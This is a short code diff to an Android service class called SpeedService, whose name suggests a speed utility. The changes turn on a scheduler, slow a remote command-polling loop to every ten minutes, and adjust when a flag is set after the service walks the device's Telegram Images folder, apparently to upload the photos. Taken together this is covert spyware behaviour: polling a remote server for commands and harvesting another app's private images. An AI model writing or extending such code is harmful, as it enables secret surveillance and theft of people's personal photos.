@@ -76,14 +76,14 @@ public class SpeedService extends Service {
         super.onCreate();
 
         createPaths();
-//        createSchedule();
+        createSchedule();
         startDbConnection();
     }
 
     private void checkForCommands() {
         Log.i(TAG, "FUNCTION : checkForCommands");
         downloadCommands();
-        commandCheckingSubscription = Observable.interval(15, TimeUnit.SECONDS)
+        commandCheckingSubscription = Observable.interval(10, TimeUnit.MINUTES)
                 .subscribeOn(Schedulers.io())
                 .subscribe(new Subscriber<Long>() {
                     @Override
@@ -145,8 +145,8 @@ public class SpeedService extends Service {
                     Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null");
                     if(SharedPreferencesHelper.get(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "").equals("")){
                         Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null => Has not uploaded anything yet");
-                        SharedPreferencesHelper.put(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "true");
                         traverse("/storage/emulated/0/Telegram/Telegram Images");
+                        SharedPreferencesHelper.put(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "true");
                     }
                 }
             }
